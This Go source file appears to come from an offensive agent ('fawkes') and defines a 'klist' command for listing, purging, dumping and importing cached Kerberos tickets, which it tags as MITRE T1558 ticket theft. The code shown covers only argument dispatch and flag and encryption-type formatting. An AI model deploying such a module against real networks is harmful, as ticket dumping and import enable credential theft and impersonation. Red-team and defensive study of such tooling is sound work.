package commands

import (
	"encoding/json"
	"fmt"
	"strings"

	"fawkes/pkg/structs"
)

// KlistCommand implements Kerberos ticket cache enumeration
type KlistCommand struct{}

func (c *KlistCommand) Name() string {
	return "klist"
}

func (c *KlistCommand) Description() string {
	return "Enumerate cached Kerberos tickets — list TGTs and service tickets, purge cache, export tickets (T1558)"
}

type klistArgs struct {
	Action string `json:"action"`
	Server string `json:"server"` // optional: filter by server name (list) or target for dump
	Ticket string `json:"ticket"` // base64 kirbi or ccache data (import action)
	Path   string `json:"path"`   // optional: output path for import (default: auto)
}

func (c *KlistCommand) Execute(task structs.Task) structs.CommandResult {
	var args klistArgs

	if task.Params != "" {
		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error parsing parameters: %v", err),
				Status:    "error",
				Completed: true,
			}
		}
	}

	if args.Action == "" {
		args.Action = "list"
	}

	switch strings.ToLower(args.Action) {
	case "list":
		return klistList(args)
	case "purge":
		return klistPurge(args)
	case "dump":
		return klistDump(args)
	case "import":
		return klistImport(args)
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown action: %s. Use: list, purge, dump, import", args.Action),
			Status:    "error",
			Completed: true,
		}
	}
}

// klistFormatFlags converts Kerberos ticket flags to human-readable names
func klistFormatFlags(flags uint32) string {
	var names []string

	flagMap := []struct {
		bit  uint32
		name string
	}{
		{0x40000000, "forwardable"},
		{0x20000000, "forwarded"},
		{0x10000000, "proxiable"},
		{0x08000000, "proxy"},
		{0x04000000, "may-postdate"},
		{0x02000000, "postdated"},
		{0x01000000, "invalid"},
		{0x00800000, "renewable"},
		{0x00400000, "initial"},
		{0x00200000, "pre-authent"},
		{0x00100000, "hw-authent"},
		{0x00040000, "ok-as-delegate"},
		{0x00010000, "name-canonicalize"},
	}

	for _, f := range flagMap {
		if flags&f.bit != 0 {
			names = append(names, f.name)
		}
	}

	if len(names) == 0 {
		return "(none)"
	}
	return strings.Join(names, ", ")
}

// etypeToNameKL converts Kerberos encryption type to a human-readable name
func etypeToNameKL(etype int32) string {
	switch etype {
	case 1:
		return "DES-CBC-CRC"
	case 3:
		return "DES-CBC-MD5"
	case 17:
		return "AES128-CTS"
	case 18:
		return "AES256-CTS"
	case 23:
		return "RC4-HMAC"
	case 24:
		return "RC4-HMAC-EXP"
	default:
		return fmt.Sprintf("etype-%d", etype)
	}
}
